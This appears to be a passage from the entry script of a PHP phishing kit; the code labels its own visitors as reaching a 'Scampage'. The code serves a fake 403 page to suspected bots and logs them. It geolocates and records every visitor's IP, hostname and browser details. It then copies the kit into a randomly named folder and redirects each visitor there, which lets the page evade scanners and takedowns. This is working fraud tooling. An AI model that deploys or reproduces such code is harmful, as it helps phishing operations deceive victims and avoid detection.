        fwrite($file," BLOCKED LOCK PLATFORM || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip2 (Lock Platform)"."\n");
        fclose($click);
        header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
        
    }
}

/// COUNTRY
$PP = getenv("REMOTE_ADDR");
$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$PP");
$COUNTRY = $_SESSION['countryx'] = $J7->geoplugin_countryName ; // Country

/// VISITOR
$click = fopen("result/log_visitor.txt","a");
$jam = date("h:i:sa");
    fwrite($click,"[$ip] Visit Scampage"."\n");
fclose($click);

$ua = $_SERVER['HTTP_USER_AGENT'];
$file = fopen("ip.txt","a");
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
fwrite($file,$ip2."  -  $hostname ($ispnya) >> [$cn | $os | $br | $ua] \n");
fclose($file);
$click = fopen("result/total_click.txt","a");
$jam = date("h:i:sa");
    fwrite($click,$ip."\n");
fclose($click);
$DIR = md5(rand(111,9999));
$SZ118="main";
function recurse_copy($SZ118,$DIR) {
$dir = opendir($SZ118);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($SZ118 . '/' . $file) ) {
recurse_copy($SZ118 . '/' . $file,$DIR . '/' . $file);
}
else {
copy($SZ118 . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
recurse_copy( $SZ118, $DIR );

//LOCATION !
header("Location: ".$DIR."");
?>
